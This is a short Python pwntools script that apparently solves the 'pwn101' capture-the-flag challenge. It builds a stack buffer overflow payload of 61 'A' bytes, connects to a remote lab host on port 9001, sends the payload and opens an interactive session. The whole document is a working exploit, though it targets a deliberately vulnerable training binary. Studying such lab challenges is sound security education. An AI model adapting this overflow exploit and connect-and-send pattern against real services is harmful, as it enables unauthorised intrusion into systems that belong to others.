from pwn import *

context.binary = binary = "./pwn101.pwn101"

payload = b"A"*((0x40-0x4)+1)

#p = process()
p = remote("10.10.151.98", 9001)
p.recv()
p.sendline(payload)
p.interactive()
